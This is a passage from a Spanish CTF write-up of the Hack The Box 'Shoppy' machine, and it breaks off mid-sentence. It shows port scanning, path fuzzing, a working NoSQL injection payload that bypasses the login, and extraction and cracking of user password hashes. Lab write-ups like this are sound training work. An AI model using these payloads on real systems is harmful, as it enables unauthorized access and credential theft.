<!doctype html><html lang="es"><head><title>Shoppy | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Hack The Box. Linux. M谩quina f谩cil. Esta m谩quina tiene una p谩gina web vulnerable a inyecci贸n NoSQL. Mediante esta vulnerabilidad, podemos saltarnos la autenticaci贸n y listar hashes de contrase帽as que se pueden romper. Luego, al enumerar subdominios encontramos una aplicaci贸n MatterMost a la que podemos entrar y ver credenciales de acceso por SSH. El primer usuario puede ejecutar un binario ELF personalizado que muestra m谩s credenciales al usar una contrase帽a maestra. Finalmente, podemos escalar privilegios porque el segundo usuario pertenece al grupo docker"><meta name="image" content="https://7rocky.github.io/images/HTB/Shoppy/Shoppy.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. M谩quina f谩cil. Esta m谩quina tiene una p谩gina web vulnerable a inyecci贸n NoSQL. Mediante esta vulnerabilidad, podemos saltarnos la autenticaci贸n y listar hashes de contrase帽as que se pueden romper. Luego, al enumerar subdominios encontramos una aplicaci贸n MatterMost a la que podemos entrar y ver credenciales de acceso por SSH. El primer usuario puede ejecutar un binario ELF personalizado que muestra m谩s credenciales al usar una contrase帽a maestra. Finalmente, podemos escalar privilegios porque el segundo usuario pertenece al grupo docker"><meta itemprop="keywords" content="sudo,docker,mongodb,nosqli,reversing,volumes,user-enumeration,password-reuse,hash-cracking,"><meta itemprop="name" content="Shoppy"><meta property="article:published_time" content="2023-01-14T00:00:00+00:00"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Hack The Box. Linux. M谩quina f谩cil. Esta m谩quina tiene una p谩gina web vulnerable a inyecci贸n NoSQL. Mediante esta vulnerabilidad, podemos saltarnos la autenticaci贸n y listar hashes de contrase帽as que se pueden romper. Luego, al enumerar subdominios encontramos una aplicaci贸n MatterMost a la que podemos entrar y ver credenciales de acceso por SSH. El primer usuario puede ejecutar un binario ELF personalizado que muestra m谩s credenciales al usar una contrase帽a maestra. Finalmente, podemos escalar privilegios porque el segundo usuario pertenece al grupo docker"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Shoppy/Shoppy.webp"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Shoppy"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/htb/shoppy/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Hack The Box. Linux. M谩quina f谩cil. Esta m谩quina tiene una p谩gina web vulnerable a inyecci贸n NoSQL. Mediante esta vulnerabilidad, podemos saltarnos la autenticaci贸n y listar hashes de contrase帽as que se pueden romper. Luego, al enumerar subdominios encontramos una aplicaci贸n MatterMost a la que podemos entrar y ver credenciales de acceso por SSH. El primer usuario puede ejecutar un binario ELF personalizado que muestra m谩s credenciales al usar una contrase帽a maestra. Finalmente, podemos escalar privilegios porque el segundo usuario pertenece al grupo docker"><meta name="twitter:description" content="Hack The Box. Linux. M谩quina f谩cil. Esta m谩quina tiene una p谩gina web vulnerable a inyecci贸n NoSQL. Mediante esta vulnerabilidad, podemos saltarnos la autenticaci贸n y listar hashes de contrase帽as que se pueden romper. Luego, al enumerar subdominios encontramos una aplicaci贸n MatterMost a la que podemos entrar y ver credenciales de acceso por SSH. El primer usuario puede ejecutar un binario ELF personalizado que muestra m谩s credenciales al usar una contrase帽a maestra. Finalmente, podemos escalar privilegios porque el segundo usuario pertenece al grupo docker"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Shoppy/Shoppy.webp"><meta name="twitter:title" content="Shoppy"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/htb/shoppy/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/shoppy/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedInOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHubOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/shoppy/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/shoppy/&amp;text=Shoppy" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/htb/shoppy/&amp;title=Shoppy" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Shoppy</h1><time class="mt4 f6 dib tracked" datetime="2023-01-14T00:00:00+01:00">14 / 01 / 2023</time><br><p class="mb4 f6 dib tracked">8 minutos de lectura</p></header><div class="htb-image"><img alt="Shoppy" src="/images/HTB/Shoppy/Shoppy.webp"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sudo" title="<code>sudo</code>"><code>sudo</code></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/docker" title="Docker">Docker</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/mongodb" title="MongoDB">MongoDB</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/nosqli" title="Inyecci贸n NoSQL">Inyecci贸n NoSQL</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/reversing" title="Ingenier铆a inversa">Ingenier铆a inversa</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/volumes" title="Montajes de volumen">Montajes de volumen</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/user-enumeration" title="Enumeraci贸n de usuarios">Enumeraci贸n de usuarios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilizaci贸n de contrase帽as">Reutilizaci贸n de contrase帽as</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/hash-cracking" title="Descifrado de <em>hashes</em> de contrase帽as">Descifrado de <em>hashes</em> de contrase帽as</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeraci贸n">Enumeraci贸n</a></li><li><a href="#acceso-a-la-m谩quina">Acceso a la m谩quina</a><ul><li><a href="#encontrando-una-inyecci贸n-nosql">Encontrando una inyecci贸n NoSQL</a></li><li><a href="#encontrando-otro-subdominio">Encontrando otro subdominio</a></li></ul></li><li><a href="#enumeraci贸n-del-sistema">Enumeraci贸n del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-deploy">Movimiento lateral al usuario <code>deploy</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer"> <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: F谩cil</li><li><strong>Direcci贸n IP</strong>: 10.10.11.180</li><li><strong>Fecha</strong>: 17 / 09 / 2022</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.180 -p 22,80,9093
Nmap scan report for 10.10.11.180
Host is up (0.058s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp   open  http     nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title:             Shoppy Wait Page
9093/tcp open  copycat?
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date:
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.  
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 5
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 5
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 2.3393e-05
|     go_gc_duration_seconds{quantile="0.25"} 6.0765e-05
|     go_gc_dur
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date:
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 5
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 5
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 2.3393e-05
|     go_gc_duration_seconds{quantile="0.25"} 6.0765e-05
|_    go_gc_dur
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 103.76 seconds
</code></pre></div><p>La m谩quina tiene abietos los puertos 22 (SSH), 80 (HTTP) y 9093.</p><h2 id="enumeraci贸n">Enumeraci贸n</h2><p>Si vamos a <code>http://10.10.11.180</code>, se nos redirige a <code>http://shoppy.htb</code>. Despu茅s de poner el dominio en <code>/etc/hosts</code>, vemos esta p谩gina:</p><p><img alt="Shoppy 1" src="/images/HTB/Shoppy/Shoppy-1.webp"></p><p>En primer lugar, vamos a enumerar rutas con <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://shoppy.htb/FUZZ
<span class="code-dark-blue">images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 101ms]</span>
<span class="code-dark-green">login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 127ms]</span>  
<span class="code-dark-blue">admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 75ms]</span>
<span class="code-dark-blue">assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 53ms]</span>
<span class="code-dark-blue">css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 51ms]</span>
<span class="code-dark-green">Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 62ms]</span>
<span class="code-dark-blue">js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 46ms]</span>
<span class="code-dark-blue">fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 43ms]</span>
<span class="code-dark-blue">Admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 76ms]</span>
<span class="code-dark-blue">exports                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 121ms]</span>
<span class="code-dark-green">                        [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 51ms]</span>
<span class="code-dark-green">LogIn                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 77ms]</span>
<span class="code-dark-green">LOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 66ms]</span>
</code></pre></div><p>Y tenemos este formulario de inicio de sesi贸n:</p><p><img alt="Shoppy 2" src="/images/HTB/Shoppy/Shoppy-2.webp"></p><p>Acepta tanto codificaci贸n URL como datos en JSON:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> shoppy.htb/login -id <span class="code-dark-yellow">'username=asdf&password=asdf'</span>
HTTP/1.1 302 Found
<span class="code-white">Server</span>: nginx/1.23.1
<span class="code-white">Date</span>:
<span class="code-white">Content-Type</span>: text/plain; charset=utf-8
<span class="code-white">Content-Length</span>: 51
<span class="code-white">Connection</span>: keep-alive
<span class="code-white">Location</span>: /login?error=WrongCredentials
<span class="code-white">Vary</span>: Accept

Found. Redirecting to /login?error=WrongCredentials

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> shoppy.htb/login -id <span class="code-dark-yellow">'{"username":"asdf","password":"asdf"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>  
HTTP/1.1 302 Found
<span class="code-white">Server</span>: nginx/1.23.1
<span class="code-white">Date</span>:
<span class="code-white">Content-Type</span>: text/plain; charset=utf-8
<span class="code-white">Content-Length</span>: 51
<span class="code-white">Connection</span>: keep-alive
<span class="code-white">Location</span>: /login?error=WrongCredentials
<span class="code-white">Vary</span>: Accept

Found. Redirecting to /login?error=WrongCredentials
</code></pre></div><h2 id="acceso-a-la-m谩quina">Acceso a la m谩quina</h2><p>Si introducimor una comilla simple para probar inyecciones comunes, obtenemos un error <code>504 Gateway Time-out</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> shoppy.htb/login -id <span class="code-dark-yellow">"username='&password=asdf"</span>
HTTP/1.1 504 Gateway Time-out
<span class="code-white">Server</span>: nginx/1.23.1
<span class="code-white">Date</span>:
<span class="code-white">Content-Type</span>: text/html
<span class="code-white">Content-Length</span>: 167
<span class="code-white">Connection</span>: keep-alive

&lt;html&gt;
&lt;head&gt;&lt;title&gt;504 Gateway Time-out&lt;/title&gt;&lt;/head&gt;  
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;504 Gateway Time-out&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.23.1&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div><p>Entonces, podemos deducir que el servidor fall贸.</p><p>Tambi茅n podemos obtener un nombre de usuario de sistema (<code>jaeger</code>) en un mensaje de error:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> shoppy.htb/login -id <span class="code-dark-yellow">'{'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>
HTTP/1.1 400 Bad Request
<span class="code-white">Server</span>: nginx/1.23.1
<span class="code-white">Date</span>:
<span class="code-white">Content-Type</span>: text/html; charset=utf-8
<span class="code-white">Content-Length</span>: 1003
<span class="code-white">Connection</span>: keep-alive
<span class="code-white">Content-Security-Policy</span>: default-src 'none'
<span class="code-white">X-Content-Type-Options</span>: nosniff

&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
&lt;meta charset="utf-8"&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;SyntaxError: Unexpected end of JSON input&lt;br&gt;    at JSON.parse (&lt;anonymous&gt;)&lt;br&gt;    at parse (/home/jaeger/ShoppyApp/node_modules/body-parser/lib/types/json.js:89:19)&lt;br&gt;    at /home/jaeger/ShoppyApp/node_modules/body-parser/lib/read.js:128:18&lt;br&gt;    at AsyncResource.runInAsyncScope (node:async_hooks:203:9)&lt;br&gt;    at invokeCallback (/home/jaeger/ShoppyApp/node_modules/raw-body/index.js:231:16)&lt;br&gt;    at done (/home/jaeger/ShoppyApp/node_modules/raw-body/index.js:220:7)&lt;br&gt;    at IncomingMessage.onEnd (/home/jaeger/ShoppyApp/node_modules/raw-body/index.js:280:7)&lt;br&gt;    at IncomingMessage.emit (node:events:513:28)&lt;br&gt;    at endReadableNT (node:internal/streams/readable:1359:12)&lt;br&gt;    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)&lt;/pre&gt;  
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div><h3 id="encontrando-una-inyecci贸n-nosql">Encontrando una inyecci贸n NoSQL</h3><p>Despu茅s de probar <em>payloads</em> de inyecci贸n de c贸digo SQL, tenemos que probar inyecciones NoSQL. El gestor de bases de datos NoSQL m谩s usado es MongoDB, por lo que podemos mirar en <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads">PayloadsAllTheThings</a> y probar unos cuantos.</p><p>Finalmente, veremos que <code>admin'||1=='1</code> funciona. De nuevo, hemos deducido que existe un usuario llamado <code>admin</code> (aunque <code>ffuf</code> mostr贸 una ruta <code>/admin</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> shoppy.htb/login -id <span class="code-dark-yellow">"username=admin'||1=='1&password=asdf"</span>
HTTP/1.1 302 Found
<span class="code-white">Server</span>: nginx/1.23.1
<span class="code-white">Date</span>:
<span class="code-white">Content-Type</span>: text/plain; charset=utf-8
<span class="code-white">Content-Length</span>: 28
<span class="code-white">Connection</span>: keep-alive
<span class="code-white">Location</span>: /admin
<span class="code-white">Vary</span>: Accept
<span class="code-white">Set-Cookie</span>: connect.sid=s%3A506EoVzvdIvr16rT-Knq0yOJjdoluPEw.ES4yGNxzYTgWMujnhgXXsyVPvhgV%2B%2F71NKeFEhm%2FaHg; Path=/; HttpOnly  

Found. Redirecting to /admin
</code></pre></div><p>Esto es lo que vemos en el navegador:</p><p><img alt="Shoppy 3" src="/images/HTB/Shoppy/Shoppy-3.webp"></p><p>Tambi茅n tenemos la posibilidad de buscar usuarios:</p><p><img alt="Shoppy 4" src="/images/HTB/Shoppy/Shoppy-4.webp"></p><p>Podemos buscar por <code>admin</code>:</p><p><img alt="Shoppy 5" src="/images/HTB/Shoppy/Shoppy-5.webp"></p><p><img alt="Shoppy 6" src="/images/HTB/Shoppy/Shoppy-6.webp"></p><p>Y obtenemos un <em>hash</em> de su contrase帽a&mldr;</p><p>Podr铆amos usar <code>ffuf</code> para enumerar m谩s usuarios, pero es mejor utilizar el mismo <em>payload</em> de inyecci贸n NoSQL de antes:</p><p><img alt="Shoppy 7" src="/images/HTB/Shoppy/Shoppy-7.webp"></p><p><img alt="Shoppy 8" src="/images/HTB/Shoppy/Shoppy-8.webp"></p><p>Aqu铆 tenemos otro <em>hash</em> de contrase帽a. Si los ponemos en <a href="https://crackstation.net">crackstation.net</a>, romperemos el de <code>josh</code>:</p><p><img alt="Shoppy 9" src="/images/HTB/Shoppy/Shoppy-9.webp"></p><p>Podemos probar esta contrase帽a en SSH para <code>josh</code> o <code>jaeger</code>, pero no funcionan. Entonces, hemos llegado a un punto muerto.</p><h3 id="encontrando-otro-subdominio">Encontrando otro subdominio</h3><p>Como la m谩quina utiliza 